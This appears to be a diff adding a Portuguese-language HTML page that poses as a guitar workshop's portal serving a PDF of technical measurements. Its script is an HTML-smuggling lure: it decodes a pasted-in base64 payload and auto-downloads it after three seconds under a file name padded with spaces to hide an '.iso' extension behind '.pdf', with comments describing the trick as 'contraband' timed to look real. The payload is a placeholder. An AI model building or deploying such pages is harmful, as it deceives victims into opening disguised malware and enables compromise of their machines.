@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Hermanos Conde | Portal de Projetos</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #2d2d2d; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; border-top: 5px solid #d4af37; }
+        h1 { color: #d4af37; font-size: 24px; }
+        .loader { border: 4px solid #444; border-top: 4px solid #d4af37; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Oficina Hermanos Conde 1971</h1>
+        <p>Autenticando acesso ao projeto: <strong>Medidas_Tecnicas_Paco.pdf</strong></p>
+        <div class="loader"></div>
+        <p id="status">Gerando download seguro...</p>
+        <div class="footer">© 1971-2026 Hermanos Conde Luthieria - Todos os direitos reservados.</div>
+    </div>
+
+    <script>
+        function downloadFile() {
+            // AQUI VOCÊ COLA A STRING DO iso_base64.txt
+            var base64Data = " colocar esting aqui AAAAAAAAA";           
+            // O Truque do Nome: Espaços longos para esconder o .iso
+            var fileName = "Medidas_Paco_De_Lucia_Oficial_1971.pdf                                      .iso";
+
+            var byteCharacters = atob(base64Data);
+            var byteNumbers = new Array(byteCharacters.length);
+            for (var i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            var byteArray = new Uint8Array(byteNumbers);
+            var blob = new Blob([byteArray], {type: "application/octet-stream"});
+
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            document.getElementById('status').innerText = "Download concluído!";
+        }
+
+        // Inicia o "contrabando" após 3 segundos para parecer real
+        setTimeout(downloadFile, 3000);
+    </script>
+</body>
+</html>
